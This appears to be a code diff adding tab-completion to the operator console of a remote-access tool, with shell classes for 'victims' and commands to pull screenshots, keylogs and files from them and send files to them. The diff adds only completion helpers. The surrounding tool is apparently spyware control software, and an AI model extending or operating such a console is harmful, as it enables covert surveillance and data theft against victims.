@@ -50,7 +50,18 @@ class BaseShell(cmd.Cmd):
     def do_exit(self, arg):
         '''exit shell'''
         return True
-        
+
+    
+    def complete_show(self, text, line, begidx, endidx, additional=[]):
+        arguments = ["log"]
+        arguments.extend(additional)
+
+        line_split = line.split(' ')
+
+        if len(line_split[1].strip()) > 0:
+            return [s for s in arguments if s.startswith(line_split[1])]
+        return arguments
+
     def do_show(self, arg):
         parsed_arg, count = self._parsing_argu(arg)
 
@@ -83,6 +94,10 @@ class EntryShell(BaseShell):
                 return key
         return False
 
+    def complete_show(self, text, line, begidx, endidx):
+        arguments = ['victim']
+        return super().complete_show(text, line, begidx, endidx, additional=arguments)
+
     def do_show(self, arg):
         parsed_arg = super().do_show(arg)
 
@@ -96,6 +111,15 @@ class EntryShell(BaseShell):
                 return
             else:
                 self.default('show ' + arg)
+
+    def complete_use(self, text, line, begidx, endidx):
+        arguments = [str(self.victims_table[ip]['index']) for ip in self.victims_table.keys()]
+        line_split = line.split(' ')
+
+        if len(line_split[1].strip()) > 0:
+            return [s for s in arguments if s.startswith(line_split[1])]
+        
+        return arguments
 
     def do_use(self, arg):
         if arg:
@@ -131,6 +155,10 @@ class VictimShell(BaseShell, SEQFileMixin):
         self.default('sh')
 
 
+    def complete_show(self, text, line, begidx, endidx):
+        arguments = ['status']
+        return super().complete_show(text, line, begidx, endidx, additional=arguments)
+    
     def do_show(self, arg):
         parsed_arg = super().do_show(arg)
 
@@ -141,7 +169,14 @@ class VictimShell(BaseShell, SEQFileMixin):
 
             else:
                 self.default('show ' + arg)
-        
+
+    def complete_get(self, text, line, begidx, endidx):
+        arguments = ["screenshot", "keylog", "file"]
+        line_split = line.split(' ')
+
+        if len(line_split[1].strip()) > 0:
+            return [s for s in arguments if s.startswith(line_split[1])]
+        return arguments
 
 
     def do_get(self, arg):
@@ -177,7 +212,15 @@ class VictimShell(BaseShell, SEQFileMixin):
         
         self.default('get ' + arg)
 
-    
+    def complete_send(self, text, line, begidx, endidx):
+        arguments = ["file"]
+        line_split = line.split(' ')
+
+        if len(line_split[1].strip()) > 0:
+            return [s for s in arguments if s.startswith(line_split[1])]
+        
+        return arguments
+
     def do_send(self, arg):
         if self.victim_table['sending_file'] != "":
             self.stdout.write("Already sending\n")
